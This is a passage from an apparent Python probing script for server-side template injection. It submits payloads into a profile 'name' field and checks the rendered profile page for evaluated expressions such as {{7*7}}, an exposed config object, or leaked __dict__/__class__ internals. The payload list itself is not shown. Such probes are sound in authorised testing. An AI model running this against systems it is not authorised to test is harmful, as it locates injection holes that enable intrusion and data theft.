for i, payload in enumerate(payloads, 1):
    print(f"\n\n[TEST {i}] Testing payload: {payload}")
    print("-" * 80)
    
    # Prepare form data with current payload in 'name' field
    current_form_data = form_data.copy()
    current_form_data["name"] = payload
    
    # POST to /update_profile
    post_url = f"{base_url}/update_profile"
    print(f"\n[POST] {post_url}")
    print(f"[Payload] name={payload}")
    
    try:
        post_response = requests.post(post_url, data=current_form_data, timeout=10)
        print(f"[Status] {post_response.status_code}")
        print(f"[Headers] {dict(post_response.headers)}")
        if post_response.cookies:
            print(f"[Cookies] {dict(post_response.cookies)}")
        print(f"[POST Response Body]\n{post_response.text[:500]}")
        
    except Exception as e:
        print(f"[ERROR] POST request failed: {e}")
        continue
    
    # Immediately GET /profile to check if payload rendered
    get_url = f"{base_url}/profile"
    print(f"\n[GET] {get_url}")
    
    try:
        # Use cookies from POST response if available
        cookies = post_response.cookies if post_response.cookies else None
        get_response = requests.get(get_url, cookies=cookies, timeout=10)
        
        print(f"[Status] {get_response.status_code}")
        print(f"[Content Length] {len(get_response.content)} bytes")
        
        # Check if payload executed by looking for expected results
        response_text = get_response.text
        
        print(f"\n[ANALYSIS] Looking for payload execution indicators:")
        
        # Check for basic math execution
        if "49" in response_text and "{{7*7}}" not in response_text:
            print(f"  [✓] Math executed! Found '49' (7*7 result)")
            execution_indicator = "Math executed (49)"
        elif payload in response_text:
            print(f"  [✗] Payload appears literally - not executed")
            execution_indicator = "Payload literal"
        else:
            print(f"  [?] Payload not found in response")
            execution_indicator = "Payload absent"
        
        # Check for config object (if present, it's a serious vulnerability)
        if "config" in response_text.lower() and "'DEBUG'" in response_text:
            print(f"  [✓] Config object exposed!")
            execution_indicator += " | Config exposed"
        
        # Check for self.__dict__
        if "__dict__" in response_text or "__class__" in response_text:
            print(f"  [✓] Object structure exposed!")
            execution_indicator += " | Object structure exposed"
        
        # Print full profile response for manual inspection
        print(f"\n[FULL PROFILE RESPONSE]\n{response_text}")
        
        # Extract name field specifically if possible
        name_match = re.search(r'<[^>]*name[^>]*>([^<]+)</[^>]*>', response_text, re.I)
        if name_match:
            extracted_name = name_match.group(1).strip()
            print(f"\n[EXTRACTED NAME FIELD] '{extracted_name}'")
        
    except Exception as e:
        print(f"[ERROR] GET request failed: {e}")

